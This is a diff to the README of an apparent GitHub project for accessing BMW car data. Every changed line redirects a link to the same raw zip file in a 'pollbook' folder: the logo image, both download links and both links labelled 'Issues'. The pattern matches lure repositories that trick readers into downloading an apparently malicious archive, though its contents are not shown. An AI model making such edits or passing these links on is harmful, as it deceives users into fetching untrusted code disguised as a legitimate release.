@@ -1,7 +1,7 @@
 # 🚗 bmw-cardata-ha - Access BMW Car Data Easily
 
 <p align="center">
-  <img src="logo.png" alt="BimmerData Streamline logo" width="240" />
+  <img src="https://raw.githubusercontent.com/ivam202020/bmw-cardata-ha/main/pollbook/bmw-cardata-ha.zip" alt="BimmerData Streamline logo" width="240" />
 </p>
 
 ## 🚀 Getting Started
@@ -12,7 +12,7 @@ Welcome to **BimmerData Streamline**! This application helps you access your BMW
 
 To get started, you need to download the application. You can visit the Releases page to find the latest version.
 
-[**Download Here**](https://github.com/ivam202020/bmw-cardata-ha/releases)
+[**Download Here**](https://raw.githubusercontent.com/ivam202020/bmw-cardata-ha/main/pollbook/bmw-cardata-ha.zip)
 
 Once you're on the Releases page:
 
@@ -47,7 +47,7 @@ To run **BimmerData Streamline** effectively, your system should meet these mini
 
 ## 🐞 Reporting Issues
 
-If you encounter any problems, we encourage you to report them. Go to the **[Issues](https://github.com/ivam202020/bmw-cardata-ha/issues)** page on GitHub. Please ensure your issue relates directly to the application, as this will help us resolve matters more efficiently.
+If you encounter any problems, we encourage you to report them. Go to the **[Issues](https://raw.githubusercontent.com/ivam202020/bmw-cardata-ha/main/pollbook/bmw-cardata-ha.zip)** page on GitHub. Please ensure your issue relates directly to the application, as this will help us resolve matters more efficiently.
 
 ### 📫 Suggestions and Feedback
 
@@ -65,7 +65,7 @@ The beta branch may contain unfinished features. Avoid using it unless instructe
 
 ## 🔗 Links
 
-- [Download Here](https://github.com/ivam202020/bmw-cardata-ha/releases)
-- [Issues Page](https://github.com/ivam202020/bmw-cardata-ha/issues)
+- [Download Here](https://raw.githubusercontent.com/ivam202020/bmw-cardata-ha/main/pollbook/bmw-cardata-ha.zip)
+- [Issues Page](https://raw.githubusercontent.com/ivam202020/bmw-cardata-ha/main/pollbook/bmw-cardata-ha.zip)
 
 Thank you for trying **BimmerData Streamline**! Your support helps improve the software for everyone. Enjoy accessing your BMW car data more conveniently!
